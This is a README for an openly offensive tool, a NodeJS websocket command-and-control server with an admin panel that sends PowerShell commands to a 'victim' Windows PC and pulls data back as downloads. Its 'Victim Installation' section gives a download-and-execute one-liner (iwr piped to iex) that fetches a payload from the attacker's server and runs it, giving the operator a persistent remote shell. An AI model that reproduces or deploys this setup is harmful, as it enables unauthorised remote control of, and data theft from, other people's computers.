# About Reverse-Powershell-Websocket

This is a NodeJS server with the ability to pass through Powershell commands to a victim.

## Features
* NodeJS server that handles messages from the attacker(s) & victim(s)
* Simple HTTP admin panel where you can send Powershell commands
* Passworded access for the websocket admin side
* Ability to decode a byte array response from Powershell into a binary download (for quick downloading of data)
* Reconnecting websocket payload Powershell script
* Powershell catches errors that may occur with commands & reports them back to the websocket

## Requirements
* A server capable of a NodeJS environment with Websocket package
* Remote PC (victim) with Windows 10/11

## Installation
 1. Open ports 3394 (default websocket) & 3395 (default http) on your server
 2. Create a NodeJS environment with Websocket package
 3. Copy files from the repo into your environment
 4. Check the settings & change password in the config file
 5. Start your node server: "node index.js" or "forever start index.js"
 6. Goto "http://[server_ip]:3395/shell.socket" in browser & enter password

## Victim Installation
 1. Edit "pl.ps1" and change the websocket address to your server: $URL = 'ws://[server_ip]:3394'
 2. Execute the payload on the remote PC: "$pl = iwr http://[server_ip]:3395/pl -UseBasicParsing; iex $pl"
 3. Check admin panel for connection

## Preview
#### 1
![settings]()
#### 2
![gateway]()
#### 3
![checkout]()
